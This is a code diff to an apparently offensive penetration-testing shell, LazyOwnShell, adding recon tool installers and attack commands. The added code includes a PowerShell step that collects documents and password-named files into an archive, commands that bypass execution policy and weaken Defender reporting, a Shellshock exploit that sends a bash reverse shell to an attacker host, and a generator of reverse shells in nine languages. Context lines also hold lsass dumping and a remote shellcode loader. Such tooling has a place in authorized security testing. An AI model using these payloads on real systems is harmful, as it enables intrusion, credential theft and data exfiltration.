@@ -4865,6 +4865,10 @@ class LazyOwnShell(Cmd):
             ("WIN copy sam3", "reg.exe save hklm\security C:\security.save"),
             ("WIN get lsass", 'Get-Process lsass (obtener el PID del proceso lsass) \r\n rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full'),
             ("WIN Execute shellcode",f'powershell -Command "$url=\'http://{lhost}/shellcode.bin\'; $shellcodeBase64=(Invoke-RestMethod -Uri $url -Method Get); $shellcode=[System.Convert]::FromBase64String($shellcodeBase64); $shellcodeBuffer=[System.Runtime.InteropServices.Marshal]::AllocHGlobal($shellcode.Length); [System.Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $shellcodeBuffer, $shellcode.Length); $functionDelegate=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($shellcodeBuffer, [System.Action]); $functionDelegate.Invoke(); [System.Runtime.InteropServices.Marshal]::FreeHGlobal($shellcodeBuffer)"'),
+            ("WIN L00T","$env:APPDATA;$files=ChildItem -Path $env:USERPROFILE\ -Include *.doc,*.xps,*.xls,*.ppt,*.pps,*.wps,*.wpd,*.ods,*.odt,*.lwp,*.jtd,*.pdf,*.zip,*.rar,*.docx,*.url,*.xlsx,*.pptx,*.ppsx,*.pst,*.ost,*psw*,*pass*,*login*,*admin*,*sifr*,*sifer*,*vpn,*.jpg,*.txt,*.lnk -Recurse -ErrorAction SilentlyContinue | Select -ExpandProperty FullName; Compress-Archive -LiteralPath $files -CompressionLevel Optimal -DestinationPath $env:APPDATA\Draft.Zip -Force"),
+            ("WIN disable exec policy", "Set-ExecutionPolicy Bypass -Scope LocalMachine -Force"),
+            ("WIN RemoteSigned", "Set-ExecutionPolicy RemoteSigned -Scope Process"),
+            ("WIN Disable defender", "Set-MpPreference -SubmitSamplesConsent 2 -MAPSReporting 0"),
             ("WEB linkedin.com workers scrapper", 'var employees = []; employees = employees.concat(document.getElementsByTagName("h3")); for(var i=0;i<employees[0].length;i++){ 	console.log(employees[0][i].innerHTML) }')
         ]
         
@@ -9091,19 +9095,15 @@ class LazyOwnShell(Cmd):
 
         This command will prompt the user for necessary information to connect to msfrpcd.
         """
-        # Prompt the user for connection details
         ip_address = input("    [!] Enter the IP address to connect to (default: 127.0.0.1): ") or "127.0.0.1"
         port = input("    [!] Enter the port to connect to (default: 55553): ") or "55553"
         username = input("    [!] Enter the username: ")
         password = input("    [!] Enter the password: ")
         use_ssl = input("    [!] Disable SSL? (yes/no, default: no): ").strip().lower() == "yes"
 
-        # Construct the msfrpc command
         cmd = ["msfrpc", "-a", ip_address, "-p", port, "-U", username, "-P", password]
         if use_ssl:
             cmd.append("-S")
-
-        # Run the command
         try:
             subprocess.run(cmd, check=True)
         except subprocess.CalledProcessError as e:
@@ -9121,17 +9121,20 @@ class LazyOwnShell(Cmd):
         """
         if not is_binary_present("nuclei"):
             print_warn("Installing nuclei...")
-            os.system("sudo apt install nuclei -y")
-            
+            os.system("go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest ")
+        os.system("sudo nuclei -update-templates")
         if line:
-            rhost = line
+            if line.startswith("url"):
+                rhost = self.params["url"]
+            else:
+                rhost = line
         else:
             rhost = self.params["rhost"]
             if not check_rhost(rhost):
                 return
-        
-        output_file = f"sessions/{rhost}_nuclei_output.txt"
-        cmd = ["nuclei", "-u", rhost, "-o", output_file]
+        domain = get_domain(rhost)
+        output_file = f"sessions/{domain}_nuclei_output.txt"
+        cmd = ["nuclei", "-u", rhost, "-o", output_file, '-tags', 'cve']
         try:
             subprocess.run(cmd, check=True)
             os.system(f"cat {output_file}")
@@ -10462,8 +10465,6 @@ class LazyOwnShell(Cmd):
         print_msg("Char List: ")
         char_list = input("    ╰─ ").strip().split()
 
-
-
         print_msg("Enter characters by commas(Ex. : ^,&,*,): ")
         more_chars = input("    ╰─ ").strip().split(',')
         char_list.extend(more_chars)
@@ -10811,20 +10812,18 @@ class LazyOwnShell(Cmd):
 
         :returns: None
         """
-        # Buscar todos los archivos JSON que contengan la palabra 'payload'
         json_files = glob.glob("*payload*.json")
         
         if not json_files:
             print_error("No JSON payload files found.")
             return
 
-        # Crear el contenido del grafo con un nodo padre
         graph_content = "digraph G {\n"
         parent_node_name = "LazyOwn"
         parent_node_label = f"{parent_node_name}\nIP: 127.0.0.1\nPort: 5555"
         graph_content += f'"{parent_node_name}" [label="{parent_node_label}"];\n'
 
-        child_nodes = []  # Lista para almacenar los nodos hijos
+        child_nodes = []
 
         for json_file in json_files:
             try:
@@ -10833,12 +10832,10 @@ class LazyOwnShell(Cmd):
                     url = data.get("url", "Unknown URL")
                     rhost = data.get("rhost", "Unknown RHOST")
                     rport = data.get("rport", "Unknown RPORT")
-
-                    # Crear un nodo para cada archivo JSON
                     node_label = f"{url}\nRHOST: {rhost}\nRPORT: {rport}"
-                    node_name = os.path.splitext(json_file)[0]  # Nombre del nodo basado en el nombre del archivo
+                    node_name = os.path.splitext(json_file)[0] 
                     graph_content += f'"{node_name}" [label="{node_label}"];\n'
-                    child_nodes.append(node_name)  # Agregar el nodo hijo a la lista
+                    child_nodes.append(node_name)  
 
             except json.JSONDecodeError:
                 print_error(f"Error decoding JSON in file: {json_file}")
@@ -10846,23 +10843,17 @@ class LazyOwnShell(Cmd):
             except FileNotFoundError:
                 print_error(f"File not found: {json_file}")
                 continue
-
-        # Conectar nodos hijos al nodo padre
         for child in child_nodes:
-            graph_content += f'"{parent_node_name}" -> "{child}";\n'  # Conexión al nodo padre
+            graph_content += f'"{parent_node_name}" -> "{child}";\n'
 
-        # Conectar nodos hijos entre sí (ejemplo simple de conexión)
         for i in range(len(child_nodes)):
             for j in range(i + 1, len(child_nodes)):
                 graph_content += f'"{child_nodes[i]}" -> "{child_nodes[j]}";\n'
 
         graph_content += "}\n"
-
-        # Escribir el contenido en graph.dot
         with open("sessions/graph.dot", 'w') as dot_file:
             dot_file.write(graph_content)
 
-        # Generar el gráfico en PNG usando dot
         os.system("dot -Tpng sessions/graph.dot -o sessions/graph.png -Gbgcolor=lightgrey -Ecolor=blue")
         print_msg("Graph generated successfully: sessions/graph.png  -Gbgcolor=lightgrey -Ecolor=blue")
         return
@@ -10929,12 +10920,16 @@ class LazyOwnShell(Cmd):
             os.system("mkdir -p ~/bypass && cd ~/bypass && git clone https://github.com/optiv/ScareCrow && cd ScareCrow && go build ScareCrow.go")
             
             command = """
+            bash -c '
             if [[ "$SHELL" == */bash ]]; then
-                echo 'export PATH=$PATH:~/bypass/ScareCrow' >> ~/.bashrc
+                echo "    [!] Bash"
+                echo "export PATH=$PATH:~/bypass/ScareCrow" >> ~/.bashrc
             elif [[ "$SHELL" == */zsh ]]; then
-                echo 'export PATH=$PATH:~/bypass/ScareCrow' >> ~/.zshrc
+                echo "    [!] Zsh"
+                echo "export PATH=$PATH:~/bypass/ScareCrow" >> ~/.zshrc
             fi
-            """
+            '
+            """.replace("            ", "")
             os.system(command)
 
         print_warn("Select the mode you want to use:")
@@ -11246,6 +11241,292 @@ class LazyOwnShell(Cmd):
 
         return
 
+    def do_vscan(self, line):
+        """Perform port scanning using vscan with the provided parameters.
+
+        :param line: This parameter is not used in the function but can be reserved for future use.
+
+        :returns: None
+
+        Manual execution:
+        To manually run `vscan` for port scanning, use the following command:
+
+            ./vscan -host <hosts> -p <ports>
+
+        This function prompts the user for the target hosts and ports, and executes the vscan command accordingly.
+        """
+        if not is_binary_present("vscan"):
+            print_warn("vscan is not installed. Installing dependencies and vscan tool.")
+            os.system("sudo apt install -y libpcap-dev golang git")
+            os.system("cd && git clone https://github.com/veo/vscan.git")
+            os.system("cd vscan && go build")
+            command = """
+            bash -c '
+            if [[ "$SHELL" == */bash ]]; then
+                echo "    [!] Bash"
+                echo "export PATH=$PATH:~/vscan" >> ~/.bashrc
+            elif [[ "$SHELL" == */zsh ]]; then
+                echo "    [!] Zsh"
+                echo "export PATH=$PATH:~/vscan" >> ~/.zshrc
+            fi
+            '
+            """.replace("            ", "")
+            os.system(command)
+        print_msg("Gathering parameters for vscan port scanning...")
+
+        rhost = self.params["rhost"]
+        hosts = input("    [!] Enter the hosts to scan (comma-separated): ").strip() or rhost
+        if not hosts:
+            print_error("    [!] Hosts cannot be empty!")
+            return
+        
+        ports = input("    [!] Enter the ports to scan (comma-separated or range): ").strip() or "80,443,22,21,23,25,110,143,53,3306,8080,3389,135,139,445,993,995,1723,111,5900,1025,465,587,49152,49153,49154,49155,49156,49157,548,631,993,2049,444,5000,5060,5800,53,111,179,123,137,138,69,514,2049,520,162,4500"
+
+        output_file = input("    [!] Enter the output file : ").strip() or hosts.replace(",","_")
+
+        command = f"cd sessions && vscan -host {hosts} -p {ports} -v"
+
+        if output_file:
+            command += f" -json -o {output_file}.json"
+
+        print_msg(f"Executing command: {command}")
+        os.system(command)
+
+        return
+
+    def do_shellshock(self, line):
+        """
+        Attempt to exploit the Shellshock vulnerability (CVE-2014-6271, CVE-2014-7169).
+
+        This function generates HTTP requests with a crafted payload to detect if a target is vulnerable to Shellshock.
+
+        :param line: Input parameters for the function.
+        :returns: None
+        """
+        lhost = self.params["lhost"]
+        lport = self.params["lport"]
+        url = self.params["url"]
+        command = f"'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'"
+        # customheader = "X-Custom-Header: () { :; }; echo; {command}".replace("{command}", command)
+        host = input(f"    [!] Enter the target host (default: {url}): ").strip() or url
+        port = input("    [!] Enter the target port (default: 80): ").strip() or "80"
+        uri = input("    [!] Enter the target URI (default: /): ").strip() or "/"
+        custom_header = input("    [!] Enter the custom header (default: None): ").strip() or None
+        cmd = input(f"    [!] Enter the command to execute (default: {command}): ").strip() or command
+        host = clean_url(host)
+        response, random_string = generate_http_req(host, port, uri, custom_header, cmd)
+        
+        if response.status_code == 200 and (random_string is None or random_string in response.text):
+            print_msg(f"    [*] The target {host}:{port} appears to be vulnerable to Shellshock!")
+            if cmd:
+                print_msg(f"    [*] Command output:\n{response.text}")
+        else:
+            print_warn(f"    [-] The target {host}:{port} does not appear to be vulnerable to Shellshock.")
+        return
+
+    def do_generate_revshell(self, line):
+        """
+        Generate a reverse shell in various programming languages.
+        
+        This function prompts the user to choose a reverse shell type (Bash, Python, NetCat, PHP, Ruby, Perl, or Telnet) 
+        and then asks for the necessary parameters (IP and port). Based on the user's input, it generates the corresponding 
+        reverse shell command.
+        
+        :param line: Not used in this implementation.
+        :returns: None
+        """
+        shell_options = {
+            "1": "Bash",
+            "2": "Python",
+            "3": "NetCat",
+            "4": "PHP",
+            "5": "Ruby",
+            "6": "Perl",
+            "7": "Telnet",
+            "8": "NodeJS",
+            "9": "Golang"
+        }
+
+        print_msg("Choose the type of reverse shell to generate:")
+        for key, value in shell_options.items():
+            print_msg(f"{key}. {value}")
+        
+        choice = input("    [!] Enter your choice (1-9): ").strip()
+        if choice not in shell_options:
+            print_error("Invalid choice. Please enter a number between 1 and 9.")
+            return
+        lhost = self.params["lhost"]
+        lport = self.params["lport"]
+        ip = input(f"    [!] Enter IP (default: {lhost}): ").strip() or lhost
+        port = input(f"    [!] Enter Port (default: {lport}): ").strip() or lport
+
+        if choice == "1":
+            command = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f"
+        elif choice == "2":
+            command = f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
+        elif choice == "3":
+            command = f"nc -e /bin/sh {ip} {port}"
+        elif choice == "4":
+            command = f"php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
+        elif choice == "5":
+            command = f"ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
+        elif choice == "6":
+            command = f"perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'"
+        elif choice == "7":
+            command = f"rm -f /tmp/p; mknod /tmp/p p && telnet {ip} {port} 0/tmp/p"
+        elif choice == "8":
+            command = f"node -e 'var net = require(\"net\"), cp = require(\"child_process\"), sh = cp.spawn(\"/bin/sh\", []); var client = new net.Socket(); client.connect({port}, \"{ip}\", function(){{ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }});'"
+        elif choice == "9":
+            command = f'package main;import"os/exec";import"net";func main(){{c,_:=net.Dial("tcp","{ip}:{port}");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}'
+
+        else:
+            print_error("Invalid selection.")
+            return
+
+        print_msg(f"Generated {shell_options[choice]} Reverse Shell:\n{command}")
+        copy2clip(command)
+        return
+
+    def do_alterx(self, line):
+        """
+        Executes the 'alterx' command for subdomain enumeration on the provided domain. If 'alterx'
+        is not installed, the function automatically downloads, installs, and configures it. The result
+        of the subdomain enumeration is saved in a session-specific text file.
+
+        Steps performed by the function:
+        
+        1. **Check if 'alterx' is installed:**
+        - Uses `is_binary_present("alterx")` to verify if the 'alterx' binary is available in the system.
+        - If the binary is not found, the function prints a warning and proceeds to download and install 'alterx'.
+
+        2. **Installation of 'alterx':**
+        - Executes a system command to create a directory named 'alterx' in the user's home directory.
+        - Downloads the 'alterx' version 0.0.4 (Linux 64-bit) from GitHub and extracts it into the 'alterx' directory.
+
+        3. **Add 'alterx' to system PATH:**
+        - Depending on the user's shell (`bash` or `zsh`), it appends the 'alterx' directory to the system PATH 
+            by modifying the appropriate shell configuration file (`~/.bashrc` or `~/.zshrc`). This ensures 'alterx' 
+            can be executed from any directory.
+
+        4. **Obtain the domain:**
+        - Retrieves the URL from the class parameter `self.params["url"]`.
+        - Extracts the domain from the URL using `get_domain(url)`.
+        - If no domain is provided as an argument in `line`, prompts the user to input a domain, defaulting to 
+            the previously extracted domain.
+
+        5. **Execute 'alterx' on the domain:**
+        - Executes the 'alterx' tool on the specified domain via a system command.
+        - The subdomain enumeration results are saved to a file in the 'sessions' directory, with the filename 
+            `subdomain_dic_<domain>.txt`.
+
+        Parameters:
+        - line (str): The domain on which to run 'alterx'. If empty, the function prompts the user for input.
+        
+        Returns:
+        - None: The function performs its operations but does not return any value.
+
+        Dependencies:
+        - The function relies on the external tool 'alterx' and assumes the presence of the `is_binary_present()` 
+        and `get_domain()` helper functions.
+        """
+        if not is_binary_present("alterx"):
+            print_warn("alterx not found. Installing...")
+            command = "cd && mkdir alterx && cd alterx && wget https://github.com/projectdiscovery/alterx/releases/download/v0.0.4/alterx_0.0.4_linux_amd64.zip && unzip alterx_0.0.4_linux_amd64.zip"
+            os.system(command)
+            command = """
+            bash -c '
+            if [[ "$SHELL" == */bash ]]; then
+                echo "    [!] Bash"
+                echo "export PATH=$PATH:~/alterx" >> ~/.bashrc
+            elif [[ "$SHELL" == */zsh ]]; then
+                echo "    [!] Zsh"
+                echo "export PATH=$PATH:~/alterx" >> ~/.zshrc
+            fi
+            '
+            """.replace("            ", "")
+            os.system(command)
+
+        url = self.params["url"]
+        domain = get_domain(url)
+        if not line:
+            line = input(f"    [!] Enter the domain: (Default: {domain})") or domain
+
+        command = f"echo {line} | alterx > sessions/subdomain_dic_{line}.txt"
+        print_msg(command)
+        os.system(command)
+        return
+
+    def do_allin(self, line):
+        """
+        Execute the AlliN.py tool with various scan modes and parameters.
+        
+        This function prompts the user to choose a scan type (e.g., pscan, sfscan, bakscan), 
+        and then asks for the necessary parameters (host, ports, project name, etc.). 
+        Based on the user's input, it generates the corresponding command and executes it.
+        
+        :param line: Not used in this implementation.
+        :returns: None
+        """
+        if not is_binary_present("AlliN.py"):
+            print_warn("AlliN.py not found. Installing...")
+            command = "cd && mkdir AlliN && cd AlliN && wget https://github.com/P1-Team/AlliN/raw/main/AlliN.py"
+            os.system(command)
+            command = """
+            bash -c '
+            if [[ "$SHELL" == */bash ]]; then
+                echo "    [!] Bash"
+                echo "export PATH=$PATH:~/AlliN" >> ~/.bashrc
+            elif [[ "$SHELL" == */zsh ]]; then
+                echo "    [!] Zsh"
+                echo "export PATH=$PATH:~/AlliN" >> ~/.zshrc
+            fi
+            '
+            """.replace("            ", "")
+            os.system(command)
+
+        scan_options = {
+            "1": "pscan",
+            "2": "sfscan",
+            "3": "bakscan",
+            "4": "subscan",
+            "5": "17scan",
+            "6": "nbscan"
+        }
+
+        print_msg("Choose the type of scan to perform with AlliN.py:")
+        for key, value in scan_options.items():
+            print_msg(f"{key}. {value}")
+        
+        choice = input("    [!] Enter your choice (1-6): ").strip()
+        if choice not in scan_options:
+            print_error("Invalid choice. Please enter a number between 1 and 6.")
+            return
+        rhost = self.params["rhost"]
+        host = input(f"    [!] Enter the host (e.g., 192.168.1.1/24 or domain.com Default: {rhost}): ").strip() or rhost
+        if not host:
+            print_error("Host is required.")
+            return
+        
+        project = input("    [!] Enter the project name (default: scan_project): ").strip() or f"scan_project_{host}"
+        timeout = input("    [!] Enter timeout in seconds (default: 3): ").strip() or "3"
+        threads = input("    [!] Enter number of threads (default: 200): ").strip() or "200"
+        ports = input("    [!] Enter ports (optional, e.g., 80,443 or leave empty): ").strip() or '80,443'
+        proxy = input("    [!] Enter proxy (optional, e.g., socks5://127.0.0.1:1080 or leave empty): ").strip()
+        path = os.getcwd()
+        sessions = f"{path}/sessions/"
+        if choice == "5":
+            python = "python2"
+        else:
+            python = "python3"
+        command = f"cd && cd AlliN && {python} AlliN.py --host {host} --timeout {timeout} -t {threads} --project {sessions}{project} -m {scan_options[choice]}"
+        
+        if ports:
+            command += f" -p {ports}"
+        if proxy:
+            command += f" --proxy {proxy}"
+        print_msg(f"Generated command: {command}")
+        os.system(command)
+        return
 
 if __name__ == "__main__":
     p = LazyOwnShell()
